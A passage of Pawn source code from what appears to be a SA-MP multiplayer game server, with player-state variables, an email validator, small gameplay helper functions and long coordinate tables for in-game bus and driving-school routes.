	ExitIP[MAX_PLAYER_NAME],
	ExitTime,
};
new ExitInfo[MAX_PLAYERS][exInfo];
new auctionpic[2];
new police[MAX_VEHICLES];
new bizname[MAX_PLAYERS][100];
new auction_info[10];
new bizselect[MAX_PLAYERS];
new KeysOffer[MAX_PLAYERS];
new KeysPrice[MAX_PLAYERS];
new KeysGram[MAX_PLAYERS];
new FreezePlayer[MAX_PLAYERS];
new Pizdorvanka[MAX_PLAYERS];
stock TextFind(text[],findtext[]) return strfind(text, findtext) != -1;
stock ValidChar(mailchar)
{
	if((mailchar >= 'A' && mailchar <= 'Z') || (mailchar >= 'a' && mailchar <= 'z')
	|| (mailchar >= '0' && mailchar <= '9') || (mailchar == '-') || (mailchar == '_')
	|| (mailchar == '@') || (mailchar == '.')) return 1;
	return 0;
}
stock IsValidEmail(email[])
{
	new bool:Success = true,
		bool:Good;
	for(new i; i < strlen(email); i++)
	{
	    if(email[i] == '@')
		{
		    if(!Good) Good = true;
		    else
			{
				Good = false;
		    	break;
			}
		}
	    if(!ValidChar(email[i])) Success = false;
	}
	if(!Good) Success = false;
	if(!TextFind(email,".ru") && !TextFind(email,".com") && !TextFind(email,".ua") && !TextFind(email,".su")) Success = false;
	if(!TextFind(email,"@")) Success = false;
  	return Success;
}
stock SetPlayerToFacePlayer(playerid, targetid)
{
        new
                Float:pX,
                Float:pY,
                Float:pZ,
                Float:X,
                Float:Y,
                Float:Z,
                Float:ang;
        if(!IsPlayerConnected(playerid) || !IsPlayerConnected(targetid)) return 0;
        GetPlayerPos(targetid, X, Y, Z);
        GetPlayerPos(playerid, pX, pY, pZ);
        if( Y > pY ) ang = (-acos((X - pX) / floatsqroot((X - pX)*(X - pX) + (Y - pY)*(Y - pY))) - 90.0);
        else if( Y < pY && X < pX ) ang = (acos((X - pX) / floatsqroot((X - pX)*(X - pX) + (Y - pY)*(Y - pY))) - 450.0);
        else if( Y < pY ) ang = (acos((X - pX) / floatsqroot((X - pX)*(X - pX) + (Y - pY)*(Y - pY))) - 90.0);
        if(X > pX) ang = (floatabs(floatabs(ang) + 180.0));
        else ang = (floatabs(ang) - 180.0);
        SetPlayerFacingAngle(playerid, ang);
        return 0;
}
stock CreateTrigger(Float:x,Float:y,Float:z)
{
	new Trigger = CreateObject(1317,x,y,z,0.0,0.0,0.0);
	SetObjectMaterial(Trigger,0,18646,"matcolours","blue",0xAA80FFDD);
	return Trigger;
}
stock TogglePlayerControllableEx(playerid,toggle)
{
	FreezePlayer[playerid] = toggle;
	TogglePlayerControllable(playerid, toggle);
	return true;
}
new Float:CarHealth[MAX_VEHICLES];
new TimeHealth[MAX_VEHICLES];
stock SetVehHealth(vehicleid, Float:health)
{
	CarHealth[vehicleid] = health;
	TimeHealth[vehicleid] = 2;
	return SetVehicleHealth(vehicleid,health);
}
#define RELEASED(%0) \
	(((newkeys & (%0)) != (%0)) && ((oldkeys & (%0)) == (%0)))
#define PRESSED(%0) \
	(((newkeys & (%0)) == (%0)) && ((oldkeys & (%0)) != (%0)))
new Float:acarsd[][3] = {
	{2120.0693,2718.2942,10.8203},
	{-1931.6606,271.5569,41.0469},
	{2507.9807,-2113.6448,13.5469}
};
new gangzonesa[MAX_PLAYERS];
new rabotaon[MAX_PLAYERS];
new nachalvzlom[MAX_PLAYERS];
new caroff[MAX_VEHICLES];
new idcarv[MAX_PLAYERS];
new timervzlom[MAX_PLAYERS];
new avtocar[MAX_PLAYERS];
new timecar[MAX_PLAYERS];
new tookmoped[MAX_PLAYERS];
new pickcars[5];
new Float:GMARMOUR[MAX_PLAYERS][1];
new Float:GMHP[MAX_PLAYERS][2];
new Float:VEHHP[MAX_PLAYERS][2];
new Text3D:JobText3D[MAX_VEHICLES];
new buscar[8];
new pPressed[MAX_PLAYERS];
new Float:BusCityLV[][] = {
	{2827.7122,1287.5374,10.4960, 2828.5979,1349.7295,10.4851},
	{2828.5979,1349.7295,10.4851, 2830.2490,1453.5867,10.4380},
	{2830.2490,1453.5867,10.4380, 2810.9434,1475.6493,10.4112},
	{2810.9434,1475.6493,10.4112, 2701.4114,1475.5786,13.2682},
	{2701.4114,1475.5786,13.2682, 2565.3254,1475.9387,10.5693},
	{2565.3254,1475.9387,10.5693, 2425.1672,1458.8348,10.3990},
	{2425.1672,1458.8348,10.3990, 2425.0232,1388.2212,10.3990},
	{2425.0232,1388.2212,10.3990, 2402.9827,1375.8306,10.3990}, ////////
	{2402.9827,1375.8306,10.3990, 2328.8313,1375.2654,10.4004},
	{2328.8313,1375.2654,10.4004, 2227.2595,1375.5146,10.5165},
	{2227.2595,1375.5146,10.5165, 2141.0669,1375.8522,10.3990},
	{2141.0669,1375.8522,10.3990, 2069.4941,1412.9413,10.3990}, ////////////
	{2069.4941,1412.9413,10.3990, 2069.3545,1555.6749,10.3985},
	{2069.3545,1555.6749,10.3985, 2074.2522,1691.2032,10.3990},
	{2074.2522,1691.2032,10.3990, 2083.3120,1731.3164,10.3990},
	{2083.3120,1731.3164,10.3990, 2137.4177,1838.8073,10.3990},
	{2137.4177,1838.8073,10.3990, 2149.4041,1949.7141,10.4067},
	{2149.4041,1949.7141,10.4067, 2154.9656,2006.7346,10.3990},
	{2154.9656,2006.7346,10.3990, 2149.2458,2047.8812,10.4067}, ///////////////////
	{2149.2458,2047.8812,10.4067, 2150.0891,2212.5806,10.3990},
	{2150.0891,2212.5806,10.3990, 2198.8176,2333.1411,10.3990},
	{2198.8176,2333.1411,10.3990, 2229.5842,2400.6025,10.3990},
	{2229.5842,2400.6025,10.3990, 2229.9485,2442.6384,10.4123},
	{2229.9485,2442.6384,10.4123, 2083.1667,2455.8521,10.399},
	{2083.1667,2455.8521,10.399, 2040.5520,2455.6323,10.3989}, /////////////
	{2040.5520,2455.6323,10.3989, 2025.2017,2409.2336,10.4048},
	{2025.2017,2409.2336,10.4048, 2010.3225,2395.3706,10.3990},
	{2010.3225,2395.3706,10.3990, 1939.4858,2395.5569,10.3990},
	{1939.4858,2395.5569,10.3990, 1925.0082,2362.3936,10.3990},
	{1925.0082,2362.3936,10.3990, 1924.9097,2314.9290,10.3990},
	{1924.9097,2314.9290,10.3990, 1925.1405,2190.0247,10.4048},
	{1925.1405,2190.0247,10.4048, 1924.7076,2116.0227,10.4982},
	{1924.7076,2116.0227,10.4982, 1924.9579,2054.0154,10.3990}, /////////////
	{1924.9579,2054.0154,10.3990, 1901.8656,2044.4187,10.3990},
	{1901.8656,2044.4187,10.3990, 1841.7213,2055.7852,10.5195},
	{1841.7213,2055.7852,10.5195, 1716.1443,2055.5381,10.4394},
	{1716.1443,2055.5381,10.4394, 1704.8038,2030.0398,10.4049},
	{1704.8038,2030.0398,10.4049, 1705.0792,1965.8193,10.3990},
	{1705.0792,1965.8193,10.3990, 1705.4348,1884.1003,10.3990},
	{1705.4348,1884.1003,10.3990, 1660.3359,1875.4397,10.3990},
	{1660.3359,1875.4397,10.3990, 1644.6434,1817.6515,10.4047},
	{1644.6434,1817.6515,10.4047, 1645.2438,1726.5471,10.3990}, /////////////////
	{1645.2438,1726.5471,10.3990, 1705.5009,1711.1305,10.3990},
	{1705.5009,1711.1305,10.3990, 1727.8558,1663.9143,9.7931},
	{1727.8558,1663.9143,9.7931, 1730.0469,1611.1600,9.5889},
	{1730.0469,1611.1600,9.5889, 1727.0743,1543.9349,10.3989},
	{1727.0743,1543.9349,10.3989, 1712.6594,1454.8257,10.4624},
	{1712.6594,1454.8257,10.4624, 1720.0021,1380.0167,10.2193},
	{1720.0021,1380.0167,10.2193, 1726.6637,1288.2371,10.3990},
	{1726.6637,1288.2371,10.3990, 1756.3873,1271.1761,11.7470},
	{1756.3873,1271.1761,11.7470, 1882.8234,1270.9567,10.3994},
	{1882.8234,1270.9567,10.3994, 2032.3241,1270.8514,10.3990},
	{2032.3241,1270.8514,10.3990, 2040.4423,1155.8553,10.3990}, ///////////////
	{2040.4423,1155.8553,10.3990, 2045.7813,1094.8022,10.3990},
	{2045.7813,1094.8022,10.3990, 2051.9490,980.1622,10.3478},
	{2051.9490,980.1622,10.3478, 2103.6660,970.9399,10.3455},
	{2103.6660,970.9399,10.3990, 2145.1384,925.0372,10.3989},
	{2145.1384,925.0372,10.3989, 2144.9375,721.4338,10.4355},
	{2144.9375,721.4338,10.4355, 2179.9919,710.7172,10.3990},
	{2179.9919,710.7172,10.3990, 2274.3362,711.1173,10.3990},
	{2274.3362,711.1173,10.3990, 2376.8376,710.9398,10.3990},
	{2376.8376,710.9398,10.3990, 2417.7654,710.7748,10.4140},
	{2417.7654,710.7748,10.4140, 2430.0789,737.1588,10.3990},
	{2430.0789,737.1588,10.3990, 2463.8088,770.4927,10.3990},
	{2463.8088,770.4927,10.3990, 2533.7329,770.6903,10.4068}, //////////////////
	{2533.7329,770.6903,10.4068, 2549.5715,813.9160,11.1068},
	{2549.5715,813.9160,11.1068, 2549.5967,941.5245,10.4065},
	{2549.5967,941.5245,10.4065, 2549.2029,1001.5764,10.3978},
	{2549.2029,1001.5764,10.3978, 2573.9358,1010.4851,10.4699},
	{2573.9358,1010.4851,10.4699, 2609.8220,1048.8676,10.3990},
	{2609.8220,1048.8676,10.3990, 2610.5010,1122.4563,10.3990},
	{2610.5010,1122.4563,10.3990, 2609.2266,1239.9553,10.3990}, ////////////////////////
	{2609.2266,1239.9553,10.3990, 2629.4099,1298.8424,10.3990},
	{2629.4099,1298.8424,10.3990, 2673.0471,1311.2069,11.5071},
	{2673.0471,1311.2069,11.5071, 2792.4287,1310.6711,10.4771},
	{2792.4287,1310.6711,10.4771, 2785.6804,1275.5779,10.4771},
	{2785.6804,1275.5779,10.4771, 2764.9609,1234.9835,10.4771},
	{2764.9609,1234.9835,10.4771, 2800.6440,1230.2970,10.4977},
	{2800.6440,1230.2970,10.4977, 2827.7122,1287.5374,10.4960},
	{2827.7122,1287.5374,10.4960, 0.0, 0.0, 0.0}
};
new Float:BusCitySF[][] = {
	{-1988.0446,140.1014,27.2661, -2003.4841,214.1351,27.2661},
	{-2003.4841,214.1351,27.2661, -2000.5131,313.4200,34.7426},
	{-2000.5131,313.4200,34.7426, -1998.5398,471.8105,34.7427},
	{-1998.5398,471.8105,34.7427, -2000.0660,589.2780,34.7443}, ///////////////
	{-2000.0660,589.2780,34.7443, -1983.1162,601.5040,34.7447},
	{-1983.1162,601.5040,34.7447, -1765.3795,600.4207,27.5781},
	{-1765.3795,600.4207,27.5781, -1708.5352,638.9060,24.4615},
	{-1708.5352,638.9060,24.4615, -1709.2012,713.6660,24.4673},
	{-1709.2012,713.6660,24.4673, -1686.2982,726.0994,21.9807},
	{-1686.2982,726.0994,21.9807, -1584.0829,725.0784,7.6853},
	{-1584.0829,725.0784,7.6853,-1539.4480,751.1326,6.7661}, ///////////////
	{-1539.4480,751.1326,6.7661, -1526.3699,902.7177,6.7661},
	{-1526.3699,902.7177,6.7661, -1566.6733,1008.7411,6.7661},
	{-1566.6733,1008.7411,6.7661, -1583.1990,1175.9945,6.7720},
	{-1583.1990,1175.9945,6.7720, -1657.7933,1278.0837,6.7703},
	{-1657.7933,1278.0837,6.7703, -1759.8112,1370.0012,6.7661},
	{-1759.8112,1370.0012,6.7661, -1893.3424,1340.7925,6.7662},
	{-1893.3424,1340.7925,6.7662, -2017.5878,1313.2760,6.7661},
	{-2017.5878,1313.2760,6.7661, -2124.4597,1335.1978,6.7739},
	{-2124.4597,1335.1978,6.7739, -2270.4126,1338.5504,6.7661},
	{-2270.4126,1338.5504,6.7661, -2457.7053,1353.1648,6.7688}, ///////////////////
	{-2457.7053,1353.1648,6.7688, -2459.7207,1222.8270,34.7824},
	{-2459.7207,1222.8270,34.7824, -2509.7961,1189.8923,39.7203},
	{-2509.7961,1189.8923,39.7203, -2647.5432,1209.3071,54.9540},
	{-2647.5432,1209.3071,54.9540, -2670.1223,1220.7137,55.1568},
	{-2670.1223,1220.7137,55.1568, -2701.2837,1216.6837,54.8801},
	{-2701.2837,1216.6837,54.8801, -2751.0327,1165.2881,51.2197},
	{-2751.0327,1165.2881,51.2197, -2732.4473,1097.7551,46.1041},
	{-2732.4473,1097.7551,46.1041, -2736.0510,1076.3564,46.6157},
	{-2736.0510,1076.3564,46.6157, -2753.1973,989.3776,54.0414},
	{-2753.1973,989.3776,54.0414, -2752.8333,889.3956,65.9159},
	{-2752.8333,889.3956,65.9159, -2753.9016,769.2898,53.9614},
	{-2753.9016,769.2898,53.9614, -2753.8579,704.6906,40.8521}, ////////////////
	{-2753.8579,704.6906,40.8521, -2752.6665,583.9778,15.5260},
	{-2752.6665,583.9778,15.5260, -2629.1440,559.9763,14.1880},
	{-2629.1440,559.9763,14.1880, -2609.3816,550.2076,14.1880}, //////////////////////////
	{-2609.3816,550.2076,14.1880, -2609.2786,419.0351,14.1443},
	{-2609.2786,419.0351,14.1443, -2623.4963,332.2929,3.9100},
	{-2623.4963,332.2929,3.9100, -2694.1890,337.3127,3.9130},
	{-2694.1890,337.3127,3.9130, -2709.2107,310.5451,3.9068},
	{-2709.2107,310.5451,3.9068, -2708.7454,265.6249,3.9068}, ////////////////////////
	{-2708.7454,265.6249,3.9068, -2708.4983,137.9188,3.9068},
	{-2708.4983,137.9188,3.9068, -2708.3228,61.5767,3.9068},
	{-2708.3228,61.5767,3.9068, -2708.6318,5.2428,3.9068},
	{-2708.6318,5.2428,3.9068, -2708.3984,-57.2606,3.9068},
	{-2708.3984,-57.2606,3.9068, -2676.2898,-72.9829,3.9068},
	{-2676.2898,-72.9829,3.9068, -2588.9204,-72.8143,3.9952}, /////////////////////
	{-2588.9204,-72.8143,3.9952, -2468.8010,-72.3784,30.7145},
	{-2468.8010,-72.3784,30.7145, -2389.8684,-72.2215,34.8912},
	{-2389.8684,-72.2215,34.8912, -2298.3589,-72.0373,34.8912},
	{-2298.3589,-72.0373,34.8912, -2199.7261,-72.9877,34.8990},
	{-2199.7261,-72.9877,34.8990, -2097.7122,-73.0991,34.8989},
	{-2097.7122,-73.0991,34.8989, -2027.6685,-73.1562,34.8990},
	{-2027.6685,-73.1562,34.8990, -2004.3160,-47.7378,34.8920}, /////////////////
	{-2004.3160,-47.7378,34.8920, -2003.9662,82.7331,27.2662},
	{-2003.9662,82.7331,27.2662, -1988.0446,140.1014,27.2661},
	{-1988.0446,140.1014,27.2661, 0.0, 0.0, 0.0}
};

new Float:BusCityLS[][] = {
	{1238.5247,-1832.1951,13.5304, 1214.3824,-1842.2007,13.5149},
	{1214.3824,-1842.2007,13.5149, 1195.2499,-1849.5330,13.5300},
	{1195.2499,-1849.5330,13.5300, 1076.8751,-1850.1189,13.5237},
	{1076.8751,-1850.1189,13.5237, 1060.6364,-1834.8591,13.6470},
	{1060.6364,-1834.8591,13.6470, 1038.0361,-1785.1960,13.68850},
	{1038.0361,-1785.1960,13.6885, 1039.8900,-1731.7588,13.5161},
	{1039.8900,-1731.7588,13.5161, 1147.0249,-1714.6013,13.9146},
	{1147.0249,-1714.6013,13.9146, 1280.5072,-1714.8085,13.5162}, // peatus
	{1280.5072,-1714.8085,13.5162, 1294.9458,-1728.1792,13.5161},
	{1294.9458,-1728.1792,13.5161, 1294.8989,-1836.0220,13.5162},
	{1294.8989,-1836.0220,13.5162, 1317.0968,-1854.8313,13.5166},
	{1317.0968,-1854.8313,13.5166, 1371.0465,-1873.2445,13.5163},
	{1371.0465,-1873.2445,13.5163, 1391.5786,-1856.0959,13.5160},
	{1391.5786,-1856.0959,13.5160, 1391.3907,-1748.5936,13.5162}, ///////////
	{1391.3907,-1748.5936,13.5162, 1481.3625,-1734.5426,13.5161},
	{1481.3625,-1734.5426,13.5161, 1514.0380,-1734.8099,13.5162}, // peatus
	{1514.0380,-1734.8099,13.5162, 1532.1124,-1715.9408,13.5138},
	{1532.1124,-1715.9408,13.5138, 1531.8948,-1609.0205,13.5159},
	{1531.8948,-1609.0205,13.5159, 1542.8218,-1594.7335,13.5161},
	{1542.8218,-1594.7335,13.5161, 1708.0238,-1595.8610,13.5001},
	{1708.0238,-1595.8610,13.5001, 1805.0760,-1614.4507,13.4869}, //////////
	{1805.0760,-1614.4507,13.4869, 1818.6862,-1681.7240,13.5161},
	{1818.6862,-1681.7240,13.5161, 1819.1482,-1627.8978,13.5161},
	{1819.1637,-1768.6271,13.5163, 1818.9535,-1917.4446,13.5157},
	{1818.9535,-1917.4446,13.5157, 1843.2506,-1934.8319,13.5140},
	{1843.2506,-1934.8319,13.5140, 1944.7305,-1934.4397,13.5162},
	{1944.7305,-1934.4397,13.5162, 1959.1595,-1948.0632,13.7346},
	{1959.1595,-1948.0632,13.7346, 1958.9994,-2124.9451,13.5161},
	{1958.9994,-2124.9451,13.5161, 1958.9464,-2150.8484,13.5161},
	{1958.9464,-2150.8484,13.5161, 1980.8533,-2169.1074,13.5130},
	{1980.8533,-2169.1074,13.5130, 2127.4326,-2210.9990,13.5161}, ////////////////
	{2127.4326,-2210.9990,13.5161, 2154.9214,-2212.8267,13.5179},
	{2154.9214,-2212.8267,13.5179, 2188.4197,-2178.9497,13.5114},
	{2188.4197,-2178.9497,13.5114, 2208.3721,-2178.8171,13.4993},
	{2208.3721,-2178.8171,13.4993, 2239.5859,-2210.0459,13.4596},
	{2239.5859,-2210.0459,13.4596, 0.0,0.0,0.0},
	{2281.9973,-2252.0698,13.6036, 2318.6899,-2256.4153,13.5084}, ///////////////////
	{2318.6899,-2256.4153,13.5084, 2413.6458,-2180.0645,13.5084},
	{2413.6458,-2180.0645,13.5084, 2621.3723,-2169.8599,11.7886},
	{2621.3723,-2169.8599,11.7886, 2796.0964,-2144.5806,11.0631},
	{2796.0964,-2144.5806,11.0631, 2837.8245,-1984.7358,11.0710},
	{2837.8245,-1984.7358,11.0710, 2870.6658,-1681.5833,11.0122},
	{2870.6658,-1681.5833,11.0122, 2841.0391,-1654.7875,10.9174},
	{2841.0391,-1654.7875,10.9174, 2661.2539,-1654.8489,10.8343},
	{2661.2539,-1654.8489,10.8343, 2640.6577,-1712.9298,10.8611}, ////////////////// два выше
	{2640.6577,-1712.9298,10.8611, 2613.0627,-1730.1464,12.0208},
	{2613.0627,-1730.1464,12.0208, 2449.7312,-1730.1978,13.6528},
	{2449.7312,-1730.1978,13.6528, 2433.1511,-1616.1829,27.0375},
	{2433.6008,-1460.0776,23.9579, 2448.9790,-1440.3479,23.9634},
	{2448.9790,-1440.3479,23.9634, 2453.5325,-1419.5775,23.9615},
	{2453.5325,-1419.5775,23.9615, 2412.3574,-1253.8340,23.9558},
	{2412.3574,-1253.8340,23.9558, 2661.2539,-1654.8489,10.8343},
	{2386.9873,-1253.6946,23.9559, 2368.4519,-1281.3727,23.9688},
	{2368.9080,-1368.3611,23.9780, 2350.8696,-1381.9030,23.9650},
	{2350.8696,-1381.9030,23.9650, 2089.6267,-1381.9432,23.9619}, ////////////////////////
	{2089.6267,-1381.9432,23.9619, 2073.4641,-1363.4091,23.9588},
	{2073.4641,-1363.4091,23.9588, 2073.3997,-1152.9436,23.8472},
	{2073.3997,-1152.9436,23.8472, 2020.2545,-1133.2900,24.8908},
	{2020.2545,-1133.2900,24.8908, 1885.3809,-1132.9916,24.0794},
	{1885.3809,-1132.9916,24.0794, 1864.2970,-1160.1176,23.8199},
	{1864.2970,-1160.1176,23.8199, 1832.4225,-1178.3257,23.7677},
	{1832.4225,-1178.3257,23.7677, 1658.9194,-1158.1030,23.8722},
	{1658.9194,-1158.1030,23.8722, 1658.9194,-1158.1030,23.8722}, ///////////////////
	{1596.3362,-1158.4154,24.0396, 1580.1649,-1142.5476,23.8254},
	{1580.1649,-1142.5476,23.8254, 1528.9998,-1039.5239,23.7696},
	{1528.9998,-1039.5239,23.7696, 1501.2731,-1032.4484,23.7743},
	{1501.2731,-1032.4484,23.7743, 1479.5311,-1051.1530,23.7892},
	{1479.5311,-1051.1530,23.7892, 1479.7573,-1142.5359,24.0396},
	{1479.7573,-1142.5359,24.0396, 1501.3533,-1163.2172,24.0473},
	{1501.3533,-1163.2172,24.0473, 1668.5289,-1163.5801,23.7890},
	{1668.5289,-1163.5801,23.7890, 1528.9998,-1039.5239,23.7696}, ///////////////////
	{1768.7809,-1169.9598,23.7872, 1827.3875,-1183.2314,23.7641},
	{1827.3875,-1183.2314,23.7641, 1845.5515,-1197.3513,22.9131},
	{1845.5515,-1197.3513,22.9131, 1845.7029,-1242.4534,14.7945},
	{1845.7029,-1242.4534,14.7945, 1868.1499,-1263.3727,13.5212},
	{1868.1499,-1263.3727,13.5212, 2049.1936,-1263.4569,23.9537},
	{2049.1936,-1263.4569,23.9537, 2065.7383,-1277.3209,23.9537},
	{2065.7383,-1277.3209,23.9537, 2065.7378,-1369.0361,23.9440}, ///////////////////
	{2065.7378,-1369.0361,23.9440, 2092.4697,-1386.9020,23.9601},
	{2092.4697,-1386.9020,23.9601, 2354.2454,-1387.0751,23.9699},
	{2354.2454,-1387.0751,23.9699, 2373.5449,-1367.9800,23.9656},
	{2373.5449,-1367.9800,23.9656, 2373.5110,-1272.2000,23.9698},
	{2373.5110,-1272.2000,23.9698, 2387.1821,-1259.2478,23.9637},
	{2387.1821,-1259.2478,23.9637,2427.7188,-1259.3298,23.9650},
	{2427.7188,-1259.3298,23.9650,1528.9998,-1039.5239,23.7696},
	{2448.7603,-1273.6116,23.9544,2448.7754,-1425.4390,23.9616}, ///////////////////
	{2448.7754,-1425.4390,23.9616,2437.4160,-1444.3368,23.9731},
	{2437.4160,-1444.3368,23.9731,2428.6941,-1466.4805,23.9613},
	{2428.6941,-1466.4805,23.9613,2428.7791,-1603.5916,26.17700},
	{2428.7791,-1603.5916,26.1770,2428.4851,-1713.3696,14.6449},
	{2428.4851,-1713.3696,14.6449,2448.9460,-1734.9404,13.6589},
	{2448.9460,-1734.9404,13.6589,2626.2710,-1734.6022,11.2428},
	{2626.2710,-1734.6022,11.2428,2640.2214,-1749.5358,10.8608}, ///////////////////
	{2640.2214,-1749.5358,10.8608,2676.4072,-1875.9507,11.0216},
	{2676.4072,-1875.9507,11.0216,2804.3679,-1893.3619,11.0543},
	{2804.3679,-1893.3619,11.0543,2822.9373,-1917.5231,11.0709},
	{2822.9373,-1917.5231,11.0709,2812.1682,-2100.1853,11.0651},
	{2812.1682,-2100.1853,11.0651,2690.8582,-2155.5874,11.0599},
	{2690.8582,-2155.5874,11.0599,2410.2681,-2165.5828,13.5078},
	{2410.2681,-2165.5828,13.5078,2305.7051,-2248.0249,13.5083}, ///////////////////
	{2305.7051,-2248.0249,13.5083,2279.8718,-2243.1921,13.7707},
	{2279.8718,-2243.1921,13.7707,2248.0229,-2211.1538,13.4549},
	{2248.0229,-2211.1538,13.4549,2448.9460,-1734.9404,13.6589},
	{2183.5237,-2146.8306,13.5025,2107.5442,-2108.1975,13.4346},
	{2107.5442,-2108.1975,13.4346,1981.2144,-2107.4551,13.4836},
	{1981.2144,-2107.4551,13.4836,1964.3152,-2092.0791,13.5240},
	{1964.3152,-2092.0791,13.5240,2428.7791,-1603.5916,26.1770},
	{1964.3152,-2092.0791,13.5240,1964.3492,-1951.3857,13.8093},
	{1964.3492,-1951.3857,13.8093,1942.7271,-1929.8000,13.5161},
	{1942.7271,-1929.8000,13.5161,1837.5028,-1930.1250,13.5169},
	{1837.5028,-1930.1250,13.5169,1824.1443,-1915.5752,13.5119},
	{1824.1443,-1915.5752,13.5119,1823.7717,-1682.7144,13.5162},
	{1823.7717,-1682.7144,13.5162,1824.1844,-1630.6477,13.5161},
	{1824.1844,-1630.6477,13.5161,1804.4215,-1609.5674,13.4862},
	{1804.4215,-1609.5674,13.4862,1681.2842,-1590.0104,13.5160},
	{1681.2842,-1590.0104,13.5160,1548.2252,-1589.9628,13.5163},
	{1548.2252,-1589.9628,13.5163,1527.2129,-1620.1754,13.5163},
	{1527.2129,-1620.1754,13.5163,1527.1331,-1714.0327,13.5162},
	{1527.1331,-1714.0327,13.5162,1514.6785,-1729.6405,13.5163},
	{1514.6785,-1729.6405,13.5163,1477.5608,-1729.8918,13.5162},
	{1477.5608,-1729.8918,13.5162,2428.7791,-1603.5916,26.1770},
	{1413.1190,-1729.7999,13.5242,1386.6285,-1749.7579,13.5160},
	{1386.6285,-1749.7579,13.5160,1386.6914,-1854.3090,13.5161},
	{1386.6914,-1854.3090,13.5161,1370.8682,-1868.1794,13.5164},
	{1370.8682,-1868.1794,13.5164,1304.9640,-1849.7131,13.5199},
	{1304.9640,-1849.7131,13.5199,1268.2179,-1839.4244,13.5244},
	{1268.2179,-1839.4244,13.5244,1238.5247,-1832.1951,13.5304},
	{1238.5247,-1832.1951,13.5304,2626.2710,-1734.6022,11.2428},
	{1238.5247,-1832.1951,13.5304,2626.2710,-1734.6022,11.2428}
};

new Float:BusSchool[][] = {
	{1603.0409,-1158.1918,24.0066, 1375.5563,-1139.8900,23.7568},
	{1375.5563,-1139.8900,23.7568, 1343.1094,-1159.3662,23.8041},
	{1343.1094,-1159.3662,23.8041, 1339.5063,-1398.3763,13.4274},
	{1339.5063,-1398.3763,13.4274, 1328.4043,-1480.9446,13.4835},
	{1328.4043,-1480.9446,13.4835, 1301.1501,-1547.1753,13.4845},
	{1301.1501,-1547.1753,13.4845, 1296.5106,-1690.7666,13.4845},
	{1296.5106,-1690.7666,13.4845, 1191.1615,-1710.6499,13.5039},
	{1191.1615,-1710.6499,13.5039, 1171.7720,-1745.2683,13.4984},
	{1171.7720,-1745.2683,13.4984, 1172.5651,-1832.8263,13.5012},
	{1172.5651,-1832.8263,13.5012, 1079.4225,-1850.4327,13.4923},
	{1079.4225,-1850.4327,13.4923, 1041.1807,-1810.7709,13.7337},
	{1041.1807,-1810.7709,13.7337, 1038.5695,-1585.4709,13.4837}, /////////////////////
	{1038.5695,-1585.4709,13.4837, 1043.2693,-1398.1222,13.4600},
	{1043.2693,-1398.1222,13.4600, 660.2036,-1395.9253,13.5005},
	{660.2036,-1395.9253,13.5005, 628.2453,-1193.4976,18.4277},
	{628.2453,-1193.4976,18.4277, 82.3714,-1257.8467,14.4748},
	{82.3714,-1257.8467,14.4748, -245.9801,-1584.6241,15.9544},
	{-245.9801,-1584.6241,15.9544, -370.6366,-1966.7914,28.2431},
	{-370.6366,-1966.7914,28.2431, -310.5305,-2225.6050,29.0027},
	{-310.5305,-2225.6050,29.0027, -103.6279,-2482.1733,37.9837},
	{-103.6279,-2482.1733,37.9837, -38.7617,-2599.2607,43.8138},
	{-38.7617,-2599.2607,43.8138, -148.6527,-2822.5200,40.2211},
	{-148.6527,-2822.5200,40.2211, -492.2774,-2758.7148,66.1703},
	{-492.2774,-2758.7148,66.1703, -910.1223,-2836.0840,70.0783}, ////////////////////
	{-910.1223,-2836.0840,70.0783, -1024.5665,-2854.1021,67.8104},
	{-1024.5665,-2854.1021,67.8104, -1313.9917,-2872.4587,58.2093},
	{-1313.9917,-2872.4587,58.2093, -1675.5028,-2681.6897,48.6797},
	{-1675.5028,-2681.6897,48.6797, -1747.6259,-2600.4617,50.0625},
	{-1747.6259,-2600.4617,50.0625, -2092.4756,-2640.7991,53.7694},
	{-2092.4756,-2640.7991,53.7694, -2376.8628,-2556.3992,44.3193},
	{-2376.8628,-2556.3992,44.3193, -2524.9465,-2165.6970,30.0705},
	{-2524.9465,-2165.6970,30.0705, -2905.8152,-1681.0071,18.7631},
	{-2905.8152,-1681.0071,18.7631, -2933.3191,-1395.1686,11.5176},
	{-2933.3191,-1395.1686,11.5176, -2865.2195,-920.1004,9.5882},
	{-2865.2195,-920.1004,9.5882, -2777.1616,-476.5119,7.2808},
	{-2777.1616,-476.5119,7.2808, -2507.3289,-342.9320,29.6137},
	{-2507.3289,-342.9320,29.6137, -2317.6519,-344.9995,39.9120},
	{-2317.6519,-344.9995,39.9120, -2072.2759,-351.5080,35.4039},
	{-2072.2759,-351.5080,35.4039, -2023.4122,-311.4927,35.4296},
	{-2023.4122,-311.4927,35.4296, -2042.3379,-290.4153,35.4915},
	{-2042.3379,-290.4153,35.4915, -2191.2529,-293.1540,35.4503},
	{-2191.2529,-293.1540,35.4503, -2198.3242,-189.7529,35.2763},
	{-2198.3242,-189.7529,35.2763, -2173.5134,-175.8506,35.2716},
	{-2173.5134,-175.8506,35.2716, -2166.2654,-92.0829,35.2821},
	{-2032.8879,-73.8608,35.2716, -2032.7073,-73.8643,35.2484},
	{-2032.7073,-73.8643,35.2484, -2006.3911,-52.6238,35.2704},
	{-2006.3911,-52.6238,35.2704, -2005.1267,81.1522,27.7284},
	{-2005.1267,81.1522,27.7284, -1989.7633,129.5122,27.6399},
	{-1989.7633,129.5122,27.6399, -1986.2164,182.6150,27.7386},
	{-1986.2164,182.6150,27.7386, -2008.8680,153.4529,27.6392},
	{-2008.8680,153.4529,27.6392, -2007.9268,-48.7648,35.2708},
	{-2007.9268,-48.7648,35.2708, -2007.5714,-86.8649,35.4429},
	{-2007.5714,-86.8649,35.4429, -2006.6643,-272.5722,35.4339},
	{-2006.6643,-272.5722,35.4339, -2046.1627,-326.3444,35.4048},
	{-2046.1627,-326.3444,35.4048, -2267.3201,-333.9951,39.5207},
	{-2267.3201,-333.9951,39.5207, -2569.2500,-333.4581,23.8381},
	{-2569.2500,-333.4581,23.8381, -2871.9785,-817.5627,7.1436},
	{-2871.9785,-817.5627,7.1436, -2913.3682,-1154.2468,9.5926}, ///////////////
	{-2913.3682,-1154.2468,9.5926, -2944.0874,-1421.8760,11.0036},
	{-2944.0874,-1421.8760,11.0036, -2873.8486,-1932.1017,36.7978},
	{-2873.8486,-1932.1017,36.7978, -2682.2700,-2065.9888,35.0296},
	{-2682.2700,-2065.9888,35.0296, -2463.1123,-2502.5300,44.1078},
	{-2463.1123,-2502.5300,44.1078, -2188.5176,-2683.3191,56.9562},
	{-2188.5176,-2683.3191,56.9562, -1819.7305,-2604.8577,55.3396},
